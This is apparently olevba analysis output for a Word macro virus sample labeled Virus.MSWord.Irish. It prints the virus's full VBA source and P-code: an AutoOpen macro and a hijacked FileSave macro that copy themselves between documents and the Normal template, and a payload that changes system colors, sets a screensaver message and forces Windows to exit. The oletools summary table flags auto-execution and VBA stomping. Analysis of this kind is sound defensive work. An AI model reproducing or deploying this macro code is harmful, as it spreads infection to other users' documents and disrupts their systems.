olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Irish
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Irish - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO WordHelpNT.bas 
in file: ./Virus.MSWord.Irish - OLE stream: 'Macros/VBA/WordHelpNT'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()

    On Error Resume Next

    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "Scrollbar", "208 227 211", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "Background", "0 128 0", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ActiveTitle", "89 151 100", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "InactiveTitle", "128 128 0", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "Menu", "162 200 169", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "Window", "89 151 100", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "WindowFrame", "0 0 0", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "MenuText", "0 0 0", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "TitleText", "255 255 255", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ActiveBorder", "162 200 169", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "InactiveBorder", "162 200 169", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "AppWorkspace", "150 192 157", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "Hilight", "89 151 100", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "HilightText", "255 255 255", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ButtonFace", "162 200 169", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ButtonShadow", "89 151 100", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "GrayText", "89 151 100", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ButtonText", "0 0 0", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "InactiveTitleText", "208 227 211", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ButtonHilight", "208 227 211", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ButtonDkShadow", "0 0 0", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ButtonLight", "162 200 169", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "InfoText", "0 0 0", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "InfoWindow", "255 255 255", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ButtonAlternateFace", "150 192 157", ""

    WordBasic.SetPrivateProfileString "Boot", "SCRNSAVE.EXE", "C:\WINDOWS\SYSTEM\SCROLL~1.SCR", "C:\WINDOWS\SYSTEM.INI"
    WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Text", "Happy Saint Patties Day ...    CDJ 1995", "C:\WINDOWS\CONTROL.INI"

WordBasic.ExitWindows

End Sub
-------------------------------------------------------------------------------
VBA MACRO AntiVirus.bas 
in file: ./Virus.MSWord.Irish - OLE stream: 'Macros/VBA/AntiVirus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim DocName$
Dim i
Dim j
Dim dlg As Object
    On Error Resume Next
    DocName$ = WordBasic.[FileName$]()
    DocName$ = " " + DocName$

    For i = 0 To Len(DocName$) - 1
        If Mid(DocName$, i + 1, 1) = "\" Then j = i
    Next i
    DocName$ = WordBasic.[Right$](DocName$, i - j - 1)



    Rem If this is a first time save, exit to the File Save As dialog   Rem and exit

    If WordBasic.[FileName$]() = DocName$ Then
        Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
        WordBasic.Dialog.FileSaveAs dlg
    Else
        WordBasic.MacroCopy "Normal:AntiVirus", DocName$ + ":AutoOpen"
        WordBasic.MacroCopy "Normal:FileSave", DocName$ + ":AntiVirus"
        WordBasic.MacroCopy "Normal:WordHelp", DocName$ + ":WordHelp"
        WordBasic.MacroCopy "Normal:WordHelpNT", DocName$ + ":WordHelpNT"
        WordBasic.Beep
        If WordBasic.CountMacros(1) < 2 Then
            WordBasic.FileSaveAs Name:=WordBasic.[FileName$](), Format:=1
        Else
            WordBasic.FileSave
        End If
    End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO WordHelp.bas 
in file: ./Virus.MSWord.Irish - OLE stream: 'Macros/VBA/WordHelp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
    WordBasic.SetProfileString "Colors", "Scrollbar", "208 227 211"
    WordBasic.SetProfileString "Colors", "Background", "0 128 0"
    WordBasic.SetProfileString "Colors", "ActiveTitle", "89 151 100"
    WordBasic.SetProfileString "Colors", "InactiveTitle", "128 128 0"
    WordBasic.SetProfileString "Colors", "Menu", "162 200 169"
    WordBasic.SetProfileString "Colors", "Window", "89 151 100"
    WordBasic.SetProfileString "Colors", "WindowFrame", "0 0 0"
    WordBasic.SetProfileString "Colors", "MenuText", "0 0 0"
    WordBasic.SetProfileString "Colors", "TitleText", "255 255 255"
    WordBasic.SetProfileString "Colors", "ActiveBorder", "162 200 169"
    WordBasic.SetProfileString "Colors", "InactiveBorder", "162 200 169"
    WordBasic.SetProfileString "Colors", "AppWorkspace", "150 192 157"
    WordBasic.SetProfileString "Colors", "Hilight", "89 151 100"
    WordBasic.SetProfileString "Colors", "HilightText", "255 255 255"
    WordBasic.SetProfileString "Colors", "ButtonFace", "162 200 169"
    WordBasic.SetProfileString "Colors", "ButtonShadow", "89 151 100"
    WordBasic.SetProfileString "Colors", "GrayText", "89 151 100"
    WordBasic.SetProfileString "Colors", "ButtonText", "0 0 0"
    WordBasic.SetProfileString "Colors", "InactiveTitleText", "208 227 211"
    WordBasic.SetProfileString "Colors", "ButtonHilight", "208 227 211"
    WordBasic.SetProfileString "Colors", "ButtonDkShadow", "0 0 0"
    WordBasic.SetProfileString "Colors", "ButtonLight", "162 200 169"
    WordBasic.SetProfileString "Colors", "InfoText", "0 0 0"
    WordBasic.SetProfileString "Colors", "InfoWindow", "255 255 255"
    WordBasic.SetProfileString "Colors", "ButtonAlternateFace", "150 192 157"



End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Irish - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim DocName$
Dim i
Dim j
    On Error Resume Next
    DocName$ = WordBasic.[FileName$]()
    DocName$ = " " + DocName$

    For i = 0 To Len(DocName$) - 1
        If Mid(DocName$, i + 1, 1) = "\" Then j = i
    Next i
    DocName$ = WordBasic.[Right$](DocName$, i - j - 1)
    WordBasic.MacroCopy DocName$ + ":AutoOpen", "Normal:AntiVirus"
    WordBasic.MacroCopy DocName$ + ":AntiVirus", "Normal:FileSave"
    WordBasic.MacroCopy DocName$ + ":WordHelp", "Normal:WordHelp"
    WordBasic.MacroCopy DocName$ + ":WordHelpNT", "Normal:WordHelpNT"
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Irish
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/WordHelpNT - 4452 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' Line #5:
' 	LitStr 0x0028 "HKEY_USERS\.Default\Control Panel\Colors"
' 	LitStr 0x0009 "Scrollbar"
' 	LitStr 0x000B "208 227 211"
' 	LitStr 0x0000 ""
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #6:
' 	LitStr 0x0028 "HKEY_USERS\.Default\Control Panel\Colors"
' 	LitStr 0x000A "Background"
' 	LitStr 0x0007 "0 128 0"
' 	LitStr 0x0000 ""
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #7:
' 	LitStr 0x0028 "HKEY_USERS\.Default\Control Panel\Colors"
' 	LitStr 0x000B "ActiveTitle"
' 	LitStr 0x000A "89 151 100"
' 	LitStr 0x0000 ""
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #8:
' 	LitStr 0x0028 "HKEY_USERS\.Default\Control Panel\Colors"
' 	LitStr 0x000D "InactiveTitle"
' 	LitStr 0x0009 "128 128 0"
' 	LitStr 0x0000 ""
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #9:
' 	LitStr 0x0028 "HKEY_USERS\.Default\Control Panel\Colors"
' 	LitStr 0x0004 "Menu"
' 	LitStr 0x000B "162 200 169"
' 	LitStr 0x0000 ""
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #10:
' 	LitStr 0x0028 "HKEY_USERS\.Default\Control Panel\Colors"
' 	LitStr 0x0006 "Window"
' 	LitStr 0x000A "89 151 100"
' 	LitStr 0x0000 ""
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #11:
' 	LitStr 0x0028 "HKEY_USERS\.Default\Control Panel\Colors"
' 	LitStr 0x000B "WindowFrame"
' 	LitStr 0x0005 "0 0 0"
' 	LitStr 0x0000 ""
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #12:
' 	LitStr 0x0028 "HKEY_USERS\.Default\Control Panel\Colors"
' 	LitStr 0x0008 "MenuText"
' 	LitStr 0x0005 "0 0 0"
' 	LitStr 0x0000 ""
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #13:
' 	LitStr 0x0028 "HKEY_USERS\.Default\Control Panel\Colors"
' 	LitStr 0x0009 "TitleText"
' 	LitStr 0x000B "255 255 255"
' 	LitStr 0x0000 ""
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #14:
' 	LitStr 0x0028 "HKEY_USERS\.Default\Control Panel\Colors"
' 	LitStr 0x000C "ActiveBorder"
' 	LitStr 0x000B "162 200 169"
' 	LitStr 0x0000 ""
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #15:
' 	LitStr 0x0028 "HKEY_USERS\.Default\Control Panel\Colors"
' 	LitStr 0x000E "InactiveBorder"
' 	LitStr 0x000B "162 200 169"
' 	LitStr 0x0000 ""
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #16:
' 	LitStr 0x0028 "HKEY_USERS\.Default\Control Panel\Colors"
' 	LitStr 0x000C "AppWorkspace"
' 	LitStr 0x000B "150 192 157"
' 	LitStr 0x0000 ""
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #17:
' 	LitStr 0x0028 "HKEY_USERS\.Default\Control Panel\Colors"
' 	LitStr 0x0007 "Hilight"
' 	LitStr 0x000A "89 151 100"
' 	LitStr 0x0000 ""
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #18:
' 	LitStr 0x0028 "HKEY_USERS\.Default\Control Panel\Colors"
' 	LitStr 0x000B "HilightText"
' 	LitStr 0x000B "255 255 255"
' 	LitStr 0x0000 ""
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #19:
' 	LitStr 0x0028 "HKEY_USERS\.Default\Control Panel\Colors"
' 	LitStr 0x000A "ButtonFace"
' 	LitStr 0x000B "162 200 169"
' 	LitStr 0x0000 ""
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #20:
' 	LitStr 0x0028 "HKEY_USERS\.Default\Control Panel\Colors"
' 	LitStr 0x000C "ButtonShadow"
' 	LitStr 0x000A "89 151 100"
' 	LitStr 0x0000 ""
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #21:
' 	LitStr 0x0028 "HKEY_USERS\.Default\Control Panel\Colors"
' 	LitStr 0x0008 "GrayText"
' 	LitStr 0x000A "89 151 100"
' 	LitStr 0x0000 ""
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #22:
' 	LitStr 0x0028 "HKEY_USERS\.Default\Control Panel\Colors"
' 	LitStr 0x000A "ButtonText"
' 	LitStr 0x0005 "0 0 0"
' 	LitStr 0x0000 ""
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #23:
' 	LitStr 0x0028 "HKEY_USERS\.Default\Control Panel\Colors"
' 	LitStr 0x0011 "InactiveTitleText"
' 	LitStr 0x000B "208 227 211"
' 	LitStr 0x0000 ""
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #24:
' 	LitStr 0x0028 "HKEY_USERS\.Default\Control Panel\Colors"
' 	LitStr 0x000D "ButtonHilight"
' 	LitStr 0x000B "208 227 211"
' 	LitStr 0x0000 ""
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #25:
' 	LitStr 0x0028 "HKEY_USERS\.Default\Control Panel\Colors"
' 	LitStr 0x000E "ButtonDkShadow"
' 	LitStr 0x0005 "0 0 0"
' 	LitStr 0x0000 ""
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #26:
' 	LitStr 0x0028 "HKEY_USERS\.Default\Control Panel\Colors"
' 	LitStr 0x000B "ButtonLight"
' 	LitStr 0x000B "162 200 169"
' 	LitStr 0x0000 ""
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #27:
' 	LitStr 0x0028 "HKEY_USERS\.Default\Control Panel\Colors"
' 	LitStr 0x0008 "InfoText"
' 	LitStr 0x0005 "0 0 0"
' 	LitStr 0x0000 ""
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #28:
' 	LitStr 0x0028 "HKEY_USERS\.Default\Control Panel\Colors"
' 	LitStr 0x000A "InfoWindow"
' 	LitStr 0x000B "255 255 255"
' 	LitStr 0x0000 ""
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #29:
' 	LitStr 0x0028 "HKEY_USERS\.Default\Control Panel\Colors"
' 	LitStr 0x0013 "ButtonAlternateFace"
' 	LitStr 0x000B "150 192 157"
' 	LitStr 0x0000 ""
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #30:
' Line #31:
' 	LitStr 0x0004 "Boot"
' 	LitStr 0x000C "SCRNSAVE.EXE"
' 	LitStr 0x001E "C:\WINDOWS\SYSTEM\SCROLL~1.SCR"
' 	LitStr 0x0015 "C:\WINDOWS\SYSTEM.INI"
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #32:
' 	LitStr 0x0014 "Screen Saver.Marquee"
' 	LitStr 0x0004 "Text"
' 	LitStr 0x0027 "Happy Saint Patties Day ...    CDJ 1995"
' 	LitStr 0x0016 "C:\WINDOWS\CONTROL.INI"
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #33:
' Line #34:
' 	Ld WordBasic 
' 	ArgsMemCall ExitWindows 0x0000 
' Line #35:
' Line #36:
' 	EndSub 
' Macros/VBA/AntiVirus - 2519 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn DocName
' Line #3:
' 	Dim 
' 	VarDefn i
' Line #4:
' 	Dim 
' 	VarDefn j
' Line #5:
' 	Dim 
' 	VarDefn dlg (As Object)
' Line #6:
' 	OnError (Resume Next) 
' Line #7:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St DocName$ 
' Line #8:
' 	LitStr 0x0001 " "
' 	Ld DocName$ 
' 	Add 
' 	St DocName$ 
' Line #9:
' Line #10:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld DocName$ 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #11:
' 	Ld DocName$ 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld i 
' 	St j 
' 	EndIf 
' Line #12:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #13:
' 	Ld DocName$ 
' 	Ld i 
' 	Ld j 
' 	Sub 
' 	LitDI2 0x0001 
' 	Sub 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	St DocName$ 
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' 	Rem 0x004D " If this is a first time save, exit to the File Save As dialog   Rem and exit"
' Line #18:
' Line #19:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	Ld DocName$ 
' 	Eq 
' 	IfBlock 
' Line #20:
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #21:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #22:
' 	ElseBlock 
' Line #23:
' 	LitStr 0x0010 "Normal:AntiVirus"
' 	Ld DocName$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #24:
' 	LitStr 0x000F "Normal:FileSave"
' 	Ld DocName$ 
' 	LitStr 0x000A ":AntiVirus"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #25:
' 	LitStr 0x000F "Normal:WordHelp"
' 	Ld DocName$ 
' 	LitStr 0x0009 ":WordHelp"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #26:
' 	LitStr 0x0011 "Normal:WordHelpNT"
' 	Ld DocName$ 
' 	LitStr 0x000B ":WordHelpNT"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #27:
' 	Ld WordBasic 
' 	ArgsMemCall Beep 0x0000 
' Line #28:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	LitDI2 0x0002 
' 	Lt 
' 	IfBlock 
' Line #29:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0002 
' Line #30:
' 	ElseBlock 
' Line #31:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	EndSub 
' Macros/VBA/WordHelp - 2865 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	LitStr 0x0006 "Colors"
' 	LitStr 0x0009 "Scrollbar"
' 	LitStr 0x000B "208 227 211"
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #3:
' 	LitStr 0x0006 "Colors"
' 	LitStr 0x000A "Background"
' 	LitStr 0x0007 "0 128 0"
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #4:
' 	LitStr 0x0006 "Colors"
' 	LitStr 0x000B "ActiveTitle"
' 	LitStr 0x000A "89 151 100"
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #5:
' 	LitStr 0x0006 "Colors"
' 	LitStr 0x000D "InactiveTitle"
' 	LitStr 0x0009 "128 128 0"
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #6:
' 	LitStr 0x0006 "Colors"
' 	LitStr 0x0004 "Menu"
' 	LitStr 0x000B "162 200 169"
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #7:
' 	LitStr 0x0006 "Colors"
' 	LitStr 0x0006 "Window"
' 	LitStr 0x000A "89 151 100"
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #8:
' 	LitStr 0x0006 "Colors"
' 	LitStr 0x000B "WindowFrame"
' 	LitStr 0x0005 "0 0 0"
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #9:
' 	LitStr 0x0006 "Colors"
' 	LitStr 0x0008 "MenuText"
' 	LitStr 0x0005 "0 0 0"
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #10:
' 	LitStr 0x0006 "Colors"
' 	LitStr 0x0009 "TitleText"
' 	LitStr 0x000B "255 255 255"
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #11:
' 	LitStr 0x0006 "Colors"
' 	LitStr 0x000C "ActiveBorder"
' 	LitStr 0x000B "162 200 169"
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #12:
' 	LitStr 0x0006 "Colors"
' 	LitStr 0x000E "InactiveBorder"
' 	LitStr 0x000B "162 200 169"
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #13:
' 	LitStr 0x0006 "Colors"
' 	LitStr 0x000C "AppWorkspace"
' 	LitStr 0x000B "150 192 157"
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #14:
' 	LitStr 0x0006 "Colors"
' 	LitStr 0x0007 "Hilight"
' 	LitStr 0x000A "89 151 100"
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #15:
' 	LitStr 0x0006 "Colors"
' 	LitStr 0x000B "HilightText"
' 	LitStr 0x000B "255 255 255"
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #16:
' 	LitStr 0x0006 "Colors"
' 	LitStr 0x000A "ButtonFace"
' 	LitStr 0x000B "162 200 169"
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #17:
' 	LitStr 0x0006 "Colors"
' 	LitStr 0x000C "ButtonShadow"
' 	LitStr 0x000A "89 151 100"
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #18:
' 	LitStr 0x0006 "Colors"
' 	LitStr 0x0008 "GrayText"
' 	LitStr 0x000A "89 151 100"
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #19:
' 	LitStr 0x0006 "Colors"
' 	LitStr 0x000A "ButtonText"
' 	LitStr 0x0005 "0 0 0"
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #20:
' 	LitStr 0x0006 "Colors"
' 	LitStr 0x0011 "InactiveTitleText"
' 	LitStr 0x000B "208 227 211"
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #21:
' 	LitStr 0x0006 "Colors"
' 	LitStr 0x000D "ButtonHilight"
' 	LitStr 0x000B "208 227 211"
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #22:
' 	LitStr 0x0006 "Colors"
' 	LitStr 0x000E "ButtonDkShadow"
' 	LitStr 0x0005 "0 0 0"
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #23:
' 	LitStr 0x0006 "Colors"
' 	LitStr 0x000B "ButtonLight"
' 	LitStr 0x000B "162 200 169"
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #24:
' 	LitStr 0x0006 "Colors"
' 	LitStr 0x0008 "InfoText"
' 	LitStr 0x0005 "0 0 0"
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #25:
' 	LitStr 0x0006 "Colors"
' 	LitStr 0x000A "InfoWindow"
' 	LitStr 0x000B "255 255 255"
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #26:
' 	LitStr 0x0006 "Colors"
' 	LitStr 0x0013 "ButtonAlternateFace"
' 	LitStr 0x000B "150 192 157"
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' 	EndSub 
' Macros/VBA/AutoOpen - 2456 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn DocName
' Line #3:
' 	Dim 
' 	VarDefn i
' Line #4:
' 	Dim 
' 	VarDefn j
' Line #5:
' 	OnError (Resume Next) 
' Line #6:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St DocName$ 
' Line #7:
' 	LitStr 0x0001 " "
' 	Ld DocName$ 
' 	Add 
' 	St DocName$ 
' Line #8:
' Line #9:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld DocName$ 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #10:
' 	Ld DocName$ 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld i 
' 	St j 
' 	EndIf 
' Line #11:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #12:
' 	Ld DocName$ 
' 	Ld i 
' 	Ld j 
' 	Sub 
' 	LitDI2 0x0001 
' 	Sub 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	St DocName$ 
' Line #13:
' 	Ld DocName$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitStr 0x0010 "Normal:AntiVirus"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #14:
' 	Ld DocName$ 
' 	LitStr 0x000A ":AntiVirus"
' 	Add 
' 	LitStr 0x000F "Normal:FileSave"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #15:
' 	Ld DocName$ 
' 	LitStr 0x0009 ":WordHelp"
' 	Add 
' 	LitStr 0x000F "Normal:WordHelp"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #16:
' 	Ld DocName$ 
' 	LitStr 0x000B ":WordHelpNT"
' 	Add 
' 	LitStr 0x0011 "Normal:WordHelpNT"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #17:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |SCRNSAVE.EXE        |Executable file name                         |
|IOC       |1.SCR               |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

